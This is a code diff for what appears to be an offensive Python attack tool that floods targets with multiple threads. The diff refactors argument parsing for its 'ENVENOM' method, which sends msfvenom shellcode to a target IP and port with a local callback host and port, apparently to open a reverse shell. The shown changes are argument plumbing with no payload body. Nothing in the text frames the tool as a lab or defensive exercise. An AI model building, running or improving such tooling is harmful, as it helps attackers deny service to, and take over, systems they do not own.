@@ -47,6 +47,14 @@ parser.add_argument(
     help="threads count (1-200)"
 )
 
+# Add envenom-specific argument parser
+envenom_parser = parser.add_argument_group("Envenom Options")
+envenom_parser.add_argument("--payload", type=str, required=False, help='Payload for msfvenom')
+envenom_parser.add_argument("--lhost", type=str, required=False, help='Local host for msfvenom payload')
+envenom_parser.add_argument("--lport", type=int, required=False, help='Local port for msfvenom payload')
+envenom_parser.add_argument("--num_packets", type=int, default=10, help='Number of packets to send')
+envenom_parser.add_argument("--burst_interval", type=float, default=1.0, help='Interval between packets in seconds')
+
 # Get args
 args = parser.parse_args()
 threads = args.threads
@@ -59,20 +67,13 @@ if not method or not target or not time:
     sys.exit(1)
 
 if method == "ENVENOM":
-    # Add envenom-specific argument parser
-    envenom_parser = argparse.ArgumentParser(description="Envenom attack options")
-    envenom_parser.add_argument("--payload", type=str, required=True, help='Payload for msfvenom')
-    envenom_parser.add_argument("--lhost", type=str, required=True, help='Local host for msfvenom payload')
-    envenom_parser.add_argument("--lport", type=int, required=True, help='Local port for msfvenom payload')
-    envenom_parser.add_argument("--num_packets", type=int, default=10, help='Number of packets to send')
-    envenom_parser.add_argument("--burst_interval", type=float, default=1.0, help='Interval between packets in seconds')
-    
-    # Parse remaining args for envenom
-    envenom_args = envenom_parser.parse_args(sys.argv[1:])
-    
+    if not args.payload or not args.lhost or not args.lport:
+        print("Error: --payload, --lhost, and --lport are required for ENVENOM method.")
+        sys.exit(1)
+
     target_ip, target_port = target.split(":")
-    tcp_shellcode_attack(target_ip, int(target_port), envenom_args.payload, envenom_args.lhost, 
-                        envenom_args.lport, envenom_args.num_packets, envenom_args.burst_interval)
+    tcp_shellcode_attack(target_ip, int(target_port), args.payload, args.lhost, 
+                        args.lport, args.num_packets, args.burst_interval)
 else:
     with AttackMethod(
         duration=time, name=method, threads=threads, target=target
